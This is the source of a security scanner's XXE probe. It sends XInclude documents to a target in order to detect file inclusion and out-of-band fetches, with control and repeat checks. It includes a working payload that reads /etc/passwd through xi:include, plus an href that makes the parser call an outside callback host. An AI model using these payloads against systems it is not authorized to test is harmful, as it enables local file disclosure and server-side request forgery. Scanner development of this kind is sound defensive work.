// Dark Matter rule-based scanner — XXE probe, XInclude file inclusion.
// (Coverage row #500 [High] XXE — XInclude, CWE-611; phase 'xxe-xinclude'.)
//
// XInclude (<xi:include>) is processed by the XML parser AFTER the
// document is parsed, so it bypasses the usual XXE defences: a parser
// hardened against DOCTYPE/external entities (the surface xxe.js owns)
// can still resolve an <xi:include href="file:///etc/passwd"/> and
// inline the file. This probe therefore NEVER sends a DOCTYPE or an
// entity payload — only XInclude elements, in a plain document with
// no DOCTYPE at all.
//
// ORACLE — three legs, tried in order; a finding fires on the first
// leg that confirms, and every leg is differential with a repeat:
//   Leg C (canary content): href points at a URL the scan controls
//     (opts.xincludeCanaryUrl) serving a known marker
//     (opts.xincludeCanaryMarker). Confirmed only when the marker
//     appears in the probe response, is absent from the benign
//     control POST, and re-appears at the same place on a repeat.
//   Leg O (out-of-band): href points at the in-process collaborator
//     canary (opts.oobCallback + opts.oobWaitFor), lab-gated exactly
//     like xxe.js (isLabTargetHost). A callback hit CONFIRMS; no hit
//     means no finding. Without a waiter the dispatch is recorded
//     as an info 'xxe_xinclude_sent' record only, mirroring xxe.js.
//   Leg F (file): href="file:///etc/passwd". Confirmed only when
//     the passwd root line (root:...:0:0:) appears in the probe
//     response, is absent from the control, and repeats. Only the
//     matched root-line fragment is quoted in evidence — never a
//     full file dump.
//   A parser that ignores XInclude stays quiet on all three legs; a
//   parser that merely echoes the submitted XML fails the repeat /
//   control gates (the href string itself contains no marker).
//
// GATES: legs C and O need their canary surfaces; leg F runs
// unconditionally (read-only file disclosure via the target's own
// parser — the standard XXE check, no write, no expansion bomb).
// POSTs application/xml, tiny bodies, no entity expansion anywhere.
//
// HONEST LIMITS: no dedicated XInclude lab exists today — verified
// against local mock servers only (an XInclude-resolving stub, a
// strict stub, and an OOB-fetching stub). A live XInclude target
// proof is a later lane. The file leg keys on /etc/passwd, so it
// cannot confirm inclusion on a non-Unix target; the canary legs
// are the portable confirmation path there.

import { isLabTargetHost } from '../../labCreds.js';

const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';
const TIMEOUT_MS = 15000;
const XI_NS = 'http://www.w3.org/2001/XInclude';
// The passwd root line, quoted in evidence only as the matched
// fragment — a well-known system-account line, never a secret.
const PASSWD_ROOT_RE = /root:[^:\r\n]*:0:0:[^\r\n]{0,40}/;

function rand() {
  return Math.random().toString(36).slice(2, 10);
}

function ev(request, response, impact, extra = {}) {
  return { request, response, impact_demo: impact, signalCorrelated: true, ...extra };
}

// ---- pure helpers (exported for unit tests) ---------------------------------

/** Build an XInclude document with no DOCTYPE. Pure. */
export function xincludePayload(href, parse = 'text') {
  return `<r xmlns:xi="${XI_NS}"><xi:include parse="${parse}" href="${href}"/></r>`;
}

/** The file-inclusion payload. Pure. */
export function xincludeFilePayload() {
  return xincludePayload('file:///etc/passwd');
}

/** The benign control document (no include at all). Pure. */
export function xincludeControlPayload() {
  return '<r>dm-control</r>';
}

/**
 * Judge a reflected-content leg: the marker must be present in the
 * probe response, absent from the control, and present again in the
 * repeat. Pure.
 */
export function assessXincludeReflection({ control, probe, repeat, marker }) {
  if (!control || !probe || !repeat || !marker) {
    return { verdict: 'unconfirmed', reason: 'incomplete leg — a request failed' };
  }
  if (control.includes(marker)) {
    return { verdict: 'rejected', reason: 'marker already present in the control response' };
  }
  if (!probe.includes(marker)) {
    return { verdict: 'rejected', reason: 'marker absent from the probe response — include not resolved' };
  }
  if (!repeat.includes(marker)) {
    return { verdict: 'unconfirmed', reason: 'marker did not reproduce on repeat' };
  }
  return { verdict: 'confirmed', reason: 'included content reflected, absent from control, repeat-stable' };
}

/**
 * Judge the file leg: the passwd root line must match in the probe
 * response, not match in the control, and match again in the repeat.
 * Returns the matched fragment for evidence, or null. Pure.
 */
export function assessXincludeFile({ control, probe, repeat }) {
  if (!control || !probe || !repeat) {
    return { verdict: 'unconfirmed', reason: 'incomplete leg — a request failed', match: null };
  }
  if (PASSWD_ROOT_RE.test(control)) {
    return { verdict: 'rejected', reason: 'passwd root line already present in the control response', match: null };
  }
  const m = probe.match(PASSWD_ROOT_RE);
  if (!m) {
    return { verdict: 'rejected', reason: 'passwd root line absent — file not included', match: null };
  }
  if (!PASSWD_ROOT_RE.test(repeat)) {
    return { verdict: 'unconfirmed', reason: 'root line did not reproduce on repeat', match: null };
  }
  return { verdict: 'confirmed', reason: 'passwd root line included, absent from control, repeat-stable', match: m[0] };
}

// ---- the probe ---------------------------------------------------------------

export async function probeXxeXinclude(url, opts = {}) {
  const findings = [];
  const diag = opts && typeof opts.diagnostics === 'object' && opts.diagnostics ? opts.diagnostics : null;
  const setDiag = (k, v) => {
    if (diag) diag[k] = v;
  };
  const timeoutMs = opts.timeoutMs || TIMEOUT_MS;
  const fetchFn = typeof opts.fetchFn === 'function' ? opts.fetchFn : globalThis.fetch;

  async function postXml(body) {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), timeoutMs);
    try {
      const res = await fetchFn(url, {
        method: 'POST',
        signal: ctrl.signal,
        headers: { 'User-Agent': UA, 'Content-Type': 'application/xml', ...(opts.headers || {}) },
        body,
      });
      const text = await res.text().catch(() => '');
      return { status: res.status, text };
    } catch {
      return { status: 0, text: '' };
    } finally {
      clearTimeout(t);
    }
  }

  // Control first: the endpoint must answer before any leg is judged.
  const control = await postXml(xincludeControlPayload());
  if (control.status === 0) {
    setDiag('skipped', 'target unreachable');
    return findings;
  }
  setDiag('controlStatus', control.status);

  // Leg C — canary content inclusion (controlled marker text).
  if (opts.xincludeCanaryUrl && opts.xincludeCanaryMarker) {
    const href = String(opts.xincludeCanaryUrl);
    const payload = xincludePayload(href);
    const probe = await postXml(payload);
    if (probe.status !== 0) {
      const repeat = await postXml(payload);
      const judged = assessXincludeReflection({
        control: control.text,
        probe: probe.text,
        repeat: repeat.text,
        marker: String(opts.xincludeCanaryMarker),
      });
      setDiag('canaryLeg', judged.verdict);
      if (judged.verdict === 'confirmed') {
        findings.push({
          class: 'xxe_xinclude',
          id: 'xxe-xinclude-canary',
          title: 'XML external entity (XXE) via XInclude — external content included',
          severity: 'high',
          url,
          evidence: ev(
            `POST application/xml with ${payload}`,
            `canary marker "${opts.xincludeCanaryMarker}" reflected in the response, absent from the benign control, repeat-stable — the parser resolved the XInclude href`,
            'XInclude resolves attacker-chosen URLs without any DOCTYPE — file disclosure / SSRF primitive past external-entity defences',
          ),
        });
        return findings;
      }
    }
  }

  // Leg O — out-of-band fetch of the collaborator canary (lab-gated).
  if (opts.oobCallback && isLabTargetHost(url, opts.labTargets)) {
    const token = `xxe-xinclude-${rand()}`;
    const oobUrl = `${String(opts.oobCallback).replace(/\/+$/, '')}/${token}`;
    const payload = xincludePayload(oobUrl);
    const rOob = await postXml(payload);
    if (rOob.status !== 0) {
      if (typeof opts.oobWaitFor === 'function') {
        const hit = await opts.oobWaitFor(token, opts.oobWaitTimeoutMs || 8000);
        setDiag('oobLeg', hit ? 'hit' : 'miss');
        if (hit) {
          findings.push({
            class: 'xxe_xinclude',
            id: `xxe-xinclude-oob-${rand()}`,
            title: 'XML external entity (XXE) via XInclude blind out-of-band — parser fetched the collaborator URL',
            severity: 'high',
            url,
            evidence: ev(
              `POST application/xml with ${payload}`,
              `XInclude href → ${oobUrl} sent (status ${rOob.status}); collaborator received ${hit.method} ${hit.path} at ${hit.at} — the parser resolved the XInclude href`,
              'Blind XInclude: the XML parser fetches attacker-controlled URLs — gateway to SSRF / file disclosure without any DOCTYPE',
              { oobHit: true },
            ),
          });
          return findings;
        }
      } else {
        findings.push({
          class: 'xxe_xinclude_sent',
          id: `xxe-xinclude-sent-${rand()}`,
          title: 'XXE XInclude OOB probe dispatched — confirm via collaborator',
          severity: 'info',
          url,
          evidence: ev(
            `POST application/xml with ${payload}`,
            `XInclude href → ${oobUrl} sent (status ${rOob.status}; canary URL only, no file targets); confirm out-of-band via the collaborator`,
            'An OOB hit proves XInclude resolution (blind XXE via XInclude)',
          ),
        });
        return findings;
      }
    }
  }

  // Leg F — file inclusion (/etc/passwd). No DOCTYPE, no entities.
  const filePayload = xincludeFilePayload();
  const probe = await postXml(filePayload);
  if (probe.status === 0) return findings;
  const repeat = await postXml(filePayload);
  const judged = assessXincludeFile({ control: control.text, probe: probe.text, repeat: repeat.text });
  setDiag('fileLeg', judged.verdict);
  if (judged.verdict === 'confirmed') {
    findings.push({
      class: 'xxe_xinclude',
      id: 'xxe-xinclude-file',
      title: 'XML external entity (XXE) via XInclude — local file included',
      severity: 'high',
      url,
      evidence: ev(
        `POST application/xml with ${filePayload}`,
        `passwd root line reflected in the response ("${judged.match}"), absent from the benign control, repeat-stable — the parser resolved the XInclude file href`,
        'XInclude file inclusion reads local files past external-entity defences — local file disclosure primitive',
      ),
    });
  }
  return findings;
}

export const __xxeXincludeMeta = { phases: ['xxe-xinclude'], depth: ['standard', 'deep'] };
